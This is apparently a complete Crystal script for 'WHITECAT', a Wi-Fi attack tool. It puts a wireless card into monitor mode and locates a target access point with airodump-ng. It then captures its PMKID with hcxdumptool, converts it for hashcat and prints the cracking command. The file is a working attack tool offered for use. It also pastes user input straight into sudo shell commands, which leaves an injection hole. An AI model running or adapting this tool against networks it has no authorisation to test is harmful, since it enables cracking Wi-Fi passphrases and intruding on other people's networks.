require "json"
require "colorize"

def startup_banner()
  puts "

  ▄▀▀▄    ▄▀▀▄  ▄▀▀▄ ▄▄   ▄▀▀█▀▄    ▄▀▀▀█▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▄▄▄▄   ▄▀▀█▄   ▄▀▀▀█▀▀▄ 
  █   █    ▐  █ █  █   ▄▀ █   █  █  █    █  ▐ ▐  ▄▀   ▐ █ █    ▌ ▐ ▄▀ ▀▄ █    █  ▐ 
  ▐  █        █ ▐  █▄▄▄█  ▐   █  ▐  ▐   █       █▄▄▄▄▄  ▐ █        █▄▄▄█ ▐   █     
    █   ▄    █     █   █      █        █        █    ▌    █       ▄▀   █    █      
     ▀▄▀ ▀▄ ▄▀    ▄▀  ▄▀   ▄▀▀▀▀▀▄   ▄▀        ▄▀▄▄▄▄    ▄▀▄▄▄▄▀ █   ▄▀   ▄▀       
           ▀     █   █    █       █ █          █    ▐   █     ▐  ▐   ▐   █         
                 ▐   ▐    ▐       ▐ ▐          ▐        ▐                ▐         ", "\n\n"
end     

def config_banner()
  system "clear"
  puts ""
  print `echo "\t        ___,-------.___"`.colorize.light_yellow
  print `echo "\t     ,--'             '--."`.colorize.light_yellow
  print `echo '\t    /                     \\\'`.colorize.light_yellow
  print `echo '\t   /                       \\\'`.colorize.light_yellow
  print `echo "\t  |                         |"`.colorize.light_yellow
  print `echo "\t |                           |"`.colorize.light_yellow
  print `echo "\t |        |~~~~~~~~~|        |"`.colorize.light_yellow
  print `echo "\t |        \\         /        |"`.colorize.light_yellow
  print `echo "\t  |        \\       /        |"`.colorize.light_yellow
  print `echo "\t   \\        \\     /        /"`.colorize.light_yellow
  print `echo "\t    \\        |   |        /"`.colorize.light_yellow
  print `echo "\t     \\       |   |       /"`.colorize.light_yellow
  print `echo "\t      \\      |   |      /"`.colorize.light_yellow
  print `echo "\t       \\     |   |     /"`.colorize.light_yellow
  print `echo "\t        \\____|___| ___/"`.colorize.light_yellow
  print `echo "\t        )___,-----'___("`
  print `echo "\t        )___,-----'___("`
  print `echo "\t        )___,-----'___("`
  print `echo "\t        )___,-----'___("`
  print `echo "\t        \\_____________/"`
  print `echo "\t             \\___/',"`
  puts "\n\t   WHITECAT Config Generator",""
  puts "\t\t   Version 1a".colorize.light_red
end

def createConfig()
  config_banner()
  print "\n[~]".colorize.light_magenta
  print " Enter BSSID > "
  inputBSSID = gets(chomp=true)
  print "\n[~]".colorize.light_magenta
  print " Enter Wifi Interface name > "
  inputWifi = gets(chomp=true)
  if File.exists?("/usr/share/WHITECAT/config.json")
    `sudo rm /usr/share/WHITECAT/config.json`
  end
  `sudo touch /usr/share/WHITECAT/config.json`
  `sudo echo '{' >> /usr/share/WHITECAT/config.json`
  `sudo echo '    "bssid": "#{inputBSSID}",' >> /usr/share/WHITECAT/config.json`
  `sudo echo '    "wifi_card": "#{inputWifi}"' >> /usr/share/WHITECAT/config.json`
  `sudo echo '}' >> /usr/share/WHITECAT/config.json`
  puts "\n[!] Config generated".colorize.light_green, ""
  puts `sudo cat /usr/share/WHITECAT/config.json`
  print "\n", "[~]".colorize.light_magenta
  puts " config.json file updated successfully!", ""
end

class Master
    # Class init
    def initialize()
        @json_object = JSON.parse(File.read("/usr/share/WHITECAT/config.json"))
    end
    # Banner creator
    def banner()
        system "clear"
        puts "
         █     █░ ██░ ██  ██▓▄▄▄█████▓▓█████  ▄████▄   ▄▄▄     ▄▄▄█████▓
        ▓█░ █ ░█░▓██░ ██▒▓██▒▓  ██▒ ▓▒▓█   ▀ ▒██▀ ▀█  ▒████▄   ▓  ██▒ ▓▒
        ▒█░ █ ░█ ▒██▀▀██░▒██▒▒ ▓██░ ▒░▒███   ▒▓█    ▄ ▒██  ▀█▄ ▒ ▓██░ ▒░
        ░█░ █ ░█ ░▓█ ░██ ░██░░ ▓██▓ ░ ▒▓█  ▄ ▒▓▓▄ ▄██▒░██▄▄▄▄██░ ▓██▓ ░ 
        ░░██▒██▓ ░▓█▒░██▓░██░  ▒██▒ ░ ░▒████▒▒ ▓███▀ ░ ▓█   ▓██▒ ▒██▒ ░ 
        ░ ▓░▒ ▒   ▒ ░░▒░▒░▓    ▒ ░░   ░░ ▒░ ░░ ░▒ ▒  ░ ▒▒   ▓▒█░ ▒ ░░   
          ▒ ░ ░   ▒ ░▒░ ░ ▒ ░    ░     ░ ░  ░  ░  ▒     ▒   ▒▒ ░   ░    
          ░   ░   ░  ░░ ░ ▒ ░  ░         ░   ░          ░   ▒    ░      
            ░     ░  ░  ░ ░              ░  ░░ ░            ░  ░        
                                             ░", "\n"
        puts "\t\t       - NO NONCE-SENSE PMKID GRABBER -".colorize.light_red
        puts ""
        puts "\t\t\t         -Version 2a-"
    end
    # Locates our BSSID
    def findBSSID()
      #Creates the first capture as a child
      child_pid = Process.fork() do
        puts ">> Starting airodump-ng survey".colorize.light_magenta, ""
        #Grabs wifi interface from json
        iface = @json_object["wifi_card"].to_s
        bssid = @json_object["bssid"]
        #Starts the airodump process
        `sudo airodump-ng -w findBSSID --band abg --bssid #{bssid} --output-format csv #{iface}`
        Signal::INT.trap() do
          puts "Signal caught. Exiting cleanly."
          exit()
        end
        loop do end
      end

      # Doesnt continue until airodump creates the file
      forever = true
      while forever == true
        if File.exists?("findBSSID-01.csv")
          forever = false
        end
      end
      #This will scan the .csv file for our target bssid
      scanning = true
      dotCounter = 0
      while scanning == true
        bssid = @json_object["bssid"].to_s
        sleep 1
        if dotCounter < 1
          print "[~] Waiting for BSSID"
          dotCounter +=1
        else
          print "."
          dotCounter +=1
        end
        #If found, send a kill command to our child process
        if File.read("findBSSID-01.csv").includes?(bssid)
          puts " // BSSID #{bssid} has been found! ".colorize.light_green, ""
          print "[~] Processing channel information.. ", ""
          channel_check = true
          while channel_check == true
            channel_num = `grep -m 1 '#{bssid}' findBSSID-01.csv | awk -F , '{print $4}'`.strip
            if channel_num == "-1"
              #continue
            else
              print "// Channel ".colorize.light_green
              print channel_num.colorize.light_green
              puts " found".colorize.light_green, ""
              channel_check = false
            end
          end
          child_pid.signal(Signal::KILL)
          scanning = false
	  `sudo pkill airodump-ng`
	  sleep 1 
        end
      end
      # Launch FIND CLIENT
      dump_PMKID(channel_num)
    end
    # Sets monitor mode
    def monset()
      # Find interface on system
      iface = @json_object["wifi_card"]
      puts "\n>>> Placing #{iface} into monitor mode".colorize.light_green
      checker = `sudo iw dev | awk '$1=="Interface"{print $2}'`
      checkerArray = checker.split("\n")
      if !checkerArray.includes? (iface)  
        puts "\n[!] #{iface} not found".colorize.light_red
        exit()
      end
      # Begin our process
      `sudo airmon-ng check kill >/dev/null`
      `sudo ip link set #{iface} down`
      `sudo iw dev #{iface} set mode monitor`
      `sudo ip link set #{iface} up`
      #`sudo hcxdumptool -m #{iface}`
      puts "", `sudo iwconfig #{iface}`
      # Verify monitor mode
      finalMon = `sudo iwconfig #{iface} | grep Mode:Monitor`
      if finalMon == ""
        puts "Wireless card failed to enter monitor mode"
        exit()
      end
  end
    # Locates our BSSID
    def dump_PMKID(channel_num)
      #Creates the first capture as a child
      child_pid = Process.fork() do
        puts ">> Starting hcxdumptool..".colorize.light_magenta, ""
        #Grabs wifi interface from json
        iface = @json_object["wifi_card"].to_s
        tmp_bssid = @json_object["bssid"].to_s
	bssid = tmp_bssid.delete(':')
        if bssid.includes?(":")
          puts "[!!!] Bssid includes colons, .delete method failed!"
          exit()
        end
        # places BSSID into a file
        `touch bssidFilter`
        `echo #{bssid.upcase} > bssidFilter`
        #Starts the airodump process
        `touch tmpTracker` 
        `sudo hcxdumptool -i #{iface} -o dump_PMKID.pcapng --active_beacon --enable_status=15 --filterlist_ap=bssidFilter --filtermode=2 >> tmpTracker`
        Signal::INT.trap() do
          exit()
        end
        loop do end
      end

      # Doesnt continue until airodump creates the file
      forever = true
      while forever == true
        if File.exists?("dump_PMKID.pcapng")
          forever = false
        end
      end
      #This will scan the .csv file for our target bssid
      scanning = true
      dotCounter = 0
      while scanning == true
        sleep 1
        if dotCounter < 1
          print "\n[!] ".colorize.light_green, "Waiting for PMKID"
          dotCounter +=1
        else
          if dotCounter > 5
            print "\r[!] ".colorize.light_green, "Waiting for PMKID"
            dotCounter = 0
          end
          print "."
          dotCounter +=1
        end
        #If found, send a kill command to our child process
        if File.read("tmpTracker").includes?("PMKID")
          bssid = @json_object["bssid"].to_s
          puts " // PMKID for #{bssid} has been found! ".colorize.light_green
          child_pid.signal(Signal::KILL)
          # Restart our card
          iface = @json_object["wifi_card"].to_s
          `sudo pkill hcxdumptool`
          `sudo ip link set #{iface} down`
          `sudo iw dev #{iface} set type managed`
          `sudo ip link set #{iface} up`
          `sudo NetworkManager restart`
          scanning = false
        end
      end
      # Prep pcap for hashcat
      puts "\r>> Converting .pcapng to 22000 hashcat format".colorize.light_magenta, ""
      puts `sudo hcxpcapngtool -o pmkid.22000 dump_PMKID.pcapng`
      print "\r"
      puts <<-'EOF'
					       ,-.       _,---._ __  / \
					      /  )    .-'       `./ /   \
					     (  (   ,'            `/    /|
					      \  `-'             \'\   / |
					       `.              ,  \ \ /  |
						       /`.          ,'-`----Y   |
					       (            ;        |   '
					       |  ,-.    ,-'         |  /
					       |  | (   |   WHITECAT | /
					       )  |  \  `.___________|/
					       `--'   `--'
      EOF
      print "\n[!]".colorize.light_red, " PMKID Converted!, run ", "sudo hashcat -m 22000 pmkid.22000 [wordlist] ".colorize.light_yellow, "\n"
    end
# End of class
end

def main()
    begin
      # Check if root
      rootCheck = `whoami`.strip
      if rootCheck != "root"
        puts ""
        STDERR.print "Run this as root, dingus (≖︿≖✿)".colorize.red
        exit()
      end

      # Cleanup old survey(s)
      `sudo rm -rf bssidFilter*`
      `sudo rm -rf dump_PMKID*`
      `sudo rm -rf pmkid.22000*`
      `sudo rm -rf tmpTracker*`
      `sudo rm -rf findBSSID*`

      # Check for config file && run if not present
      if !Dir.exists?("/usr/share/WHITECAT")
         `sudo mkdir /usr/share/WHITECAT`
          createConfig()
      elsif !File.exists?("/usr/share/WHITECAT/config.json")
          createConfig()
      elsif File.exists?("/usr/share/WHITECAT/config.json")
          system "clear"
          startup_banner()
          print "[?]".colorize.light_magenta
          print " Do you wish to create a new config?\n"
          print "\n1. Yes\n2. No\n\n"
          print "[WHITECAT] > ".colorize.light_green
          question = gets(chomp=true)
          if question == "1"
            createConfig()
          end
      end
      # Unleash the moth
      🤍 = Master.new()
      # trapper
      Signal::INT.trap() do
        `sudo pkill hcxdumptool`
        `sudo pkill hcxpcaptool`
        exit()
      end
      # Do stuff
      🤍.banner
      🤍.monset
      🤍.findBSSID
    ensure
      #startup_banner()
      puts "\n\t\tHashcat the cat with the hash....cat".colorize.red
      `sudo pkill hcxdumptool`
      `sudo pkill hcxpcaptool`
      sleep 1
      exit()
    end
end

main()
